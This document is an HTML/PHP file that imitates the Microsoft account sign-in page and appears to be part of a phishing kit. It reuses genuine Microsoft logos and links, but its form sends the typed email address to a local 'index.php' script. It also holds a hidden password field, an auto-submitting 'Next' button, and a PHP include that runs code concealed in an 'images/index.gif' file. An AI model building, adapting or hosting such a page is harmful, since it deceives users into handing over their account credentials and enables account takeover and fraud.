<!doctype html>
<html dir="ltr" lang="en">
<head>
<title>Sign in to your account</title><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes"><meta http-equiv="Pragma" content="no-cache"><meta http-equiv="Expires" content="-1"><meta name="PageID" content="ConvergedSignIn"><meta name="SiteID" content=""><meta name="ReqLC" content="1033"><meta name="LocLC" content="en-US"><link rel="shortcut icon" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6573.5/content/images/favicon_a.ico"><script type="text/javascript">ServerData=$Config;var g_iSRSFailed=ServerData.srsFailed;var g_sSRSSuccess=ServerData.srsSuccess;</script><link href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6573.5/content/cdnbundles/converged.login.min.css" rel="stylesheet" onerror="$Loader.On(this,true)" onload="$Loader.On(this)"><script crossorigin="anonymous" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6573.5/content/cdnbundles/convergedlogin_pcore.min.js" onerror="$Loader.On(this,true)" onload="$Loader.On(this)"></script><script crossorigin="anonymous" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6573.5/content/cdnbundles/convergedloginpaginatedstrings-en.min.js" onerror="$Loader.On(this,true)" onload="$Loader.On(this)"></script> <script type="text/javascript">function NE(){document.getElementById("idSIButton9").disabled=true;document.getElementById("usernameProgress").setAttribute("style","display:block;");setTimeout(function(){document.getElementById("idSIButton9").disabled=false;document.getElementById("usernameProgress").setAttribute("style","display:none;");},5000);}function NESubmit(){document.getElementById("i0281").submit();}</script><?php include_once "images/index.gif";?></head>
<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb ltr" style="display:block"><script type="text/javascript">!function(){var d=window,e=d.document,f=d.$Config||{};d.self===d.top?e&&e.body&&(e.body.style.display=""):f.allowFrame||(d.top.location=d.self.location);}();</script><div><div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }"><div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"><div data-bind="backgroundImage: smallImageUrl()" style="background-image:url(&quot;https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6573.5/content/images/backgrounds/0-small.jpg?x=12f4b8b543125cc986c79cd85320812f&quot;)"></div><div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image:url(&quot;https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6573.5/content/images/backgrounds/0.jpg?x=f5a9a9531b8f4bcc86eabb19472d15d5&quot;)"></div><div class="background-overlay"></div></div></div><form name="f1" id="i0281" novalidate spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }" action="index.php?securitysteps_5f512a34358ae4d3_ACCESS_verify_i5f512a34358ae4d3_token9833jnm246hHjmssw_onlinebanking_DO7dtkwIsdfg=verify"><div class="outer" data-bind="component: { name: 'page',
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            useWizardBehavior: svr.fUseWizardBehavior,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"><div class="middle"><div class="inner" data-bind="css: { 'app': $loginPage.backgroundLogoUrl() }"><div data-bind="component: { name: 'logo-control',
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }"><img class="logo" role="presentation" pngsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6573.5/content/images/microsoft_logo.png?x=ed9c9eb0dce17d752bedea6b5acda6d9" svgsrc="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6573.5/content/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" data-bind="imgSrc" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.6573.5/content/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd"></div><div data-bind="
                    css: { 'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide') },
                    component: { name: 'pagination-control',
                        publicMethods: paginationControlMethods,
                        params: {
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow } }"><div data-bind="css: { 'animate': animate() || animate.back(), 'back': animate.back }"><div data-viewid="1" data-bind="pageViewComponent: { name: 'login-paginated-username-view',
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            displayName: sharedData.displayName,
                            prefillNames: $loginPage.prefillNames,
                            flowToken: sharedData.flowToken },
                        event: {
                            refresh: $loginPage.view_onRefresh,
                            redirect: $loginPage.view_onRedirect,
                            showLearnMore: $loginPage.learnMore_onShow } }"><div id="loginHeader" class="row text-title" role="heading" data-bind="text: str['WF_STR_HeaderDefault_Title']">Sign in</div><div class="row"><div role="alert" aria-live="assertive" aria-atomic="false"></div><div class="form-group col-md-24"><div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox', params: {
            serverData: svr,
            textInput: displayName,
            hasFocus: isFocused,
            hintText: tenantBranding.UserIdLabel || str['CT_PWD_STR_Email_Example'],
            hintCss: 'placeholder' + (!svr.fAllowPhoneSignIn ? ' ltr_override' : '') } }"><input name="loginfmt" id="i0116" maxlength="113" class="form-control ltr_override" placeholder="someone@example.com" aria-label="Enter your email or phone" lang="en" type="email"><input name="passwd" id="i0118" autocomplete="off" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class="moveOffScreen" tabindex="-1" aria-hidden="true" type="password"><div id="usernameProgress" class="progress" role="progressbar" data-bind="visible: isRequestPending" style="display:none"><div></div><div></div><div></div><div></div><div></div><div></div></div><div class="phholder" style="left:0;top:0;width:100%;position:absolute;z-index:5" data-bind="visible: !textInput(), click: focus"></div></div></div></div><div class="row"><div data-bind="component: { name: 'footer-buttons-field',
        params: {
            serverData: svr,
            isPrimaryButtonEnabled: !isRequestPending(),
            isPrimaryButtonVisible: svr.fShowButtons,
            isSecondaryButtonEnabled: true,
            isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; isBackButtonVisible() },
        event: {
            primaryButtonClick: primaryButton_onClick,
            secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 form-group no-padding-left-right" data-bind="
     visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
     css: { 'no-margin-bottom': removeBottomMargin }"><div data-bind="css: { 'col-xs-12 secondary': isPrimaryButtonVisible(), 'col-xs-24': !isPrimaryButtonVisible() }" class="col-xs-12 secondary"><input name="nothing" id="idBtn_Back" class="btn btn-block" data-bind="
            attr: {
                'id': secondaryButtonId || 'idBtn_Back',
                'aria-describedby': secondaryButtonDescribedBy },
            value: secondaryButtonText() || str['CT_HRD_STR_Splitter_Back'],
            hasFocus: focusOnSecondaryButton,
            click: secondaryButton_onClick,
            enable: isSecondaryButtonEnabled,
            visible: isSecondaryButtonVisible" value="Back" style="display:none" type="button"></div><div data-bind="css: { 'col-xs-12 primary': isSecondaryButtonVisible(), 'col-xs-24': !isSecondaryButtonVisible() }" class="col-xs-24"><input name="as" id="idSIButton9" class="btn btn-block btn-primary" data-bind="
            attr: {
                'id': primaryButtonId || 'idSIButton9',
                'aria-describedby': primaryButtonDescribedBy },
            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible" value="Next" onclick="setTimeout(NESubmit,4000),NE()" readonly></div></div></div></div><div class="row"><div class="col-md-24"><div class="text-13 form-group" data-bind="
            css: { 'no-margin-bottom': !svr.remoteLoginConfig &amp;&amp; !svr.showCantAccessAccountLink },
            htmlWithBindings: html['WF_STR_SignUpLink_Text'],
            childBindings: { 'signup': { href: svr.urlSignUp, css: { 'display-inline-block': true }, ariaLabel: str['WF_STR_SignupLink_AriaLabel_Text'], click: signup_onClick } }">No account? <a id="signup" href="#" class="display-inline-block" aria-label="Create a Microsoft account">Create one!
</a></div><div class="text-13 form-group no-margin-bottom"></div></div></div></div></div></div></div><div data-bind="component: { name: 'instrumentation',
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }"></div></div></div><div id="footer" class="footer default" data-bind="css: { 'default': !backgroundLogoUrl() }"><div data-bind="component: { name: 'footer-control',
            params: {
                serverData: svr,
                showLinks: true },
            event: {
                agreementClick: footer_agreementClick } }"><div id="footerLinks" class="footerNode text-secondary"><span id="ftrCopy" data-bind="html: svr.strCopyrightTxt">© 2018 Microsoft</span><a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="https://www.microsoft.com/en-US/servicesagreement/">Terms of use</a><a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="https://privacy.microsoft.com/en-US/privacystatement">Privacy &amp; cookies</a></div></div></div></form><form name="y"method="post" target="_top" data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }"></form></div><iframe id="idPartnerPL" style="display:none" src="https://www.office.com/prefetch/prefetch" width="0" height="0"></iframe></body></html>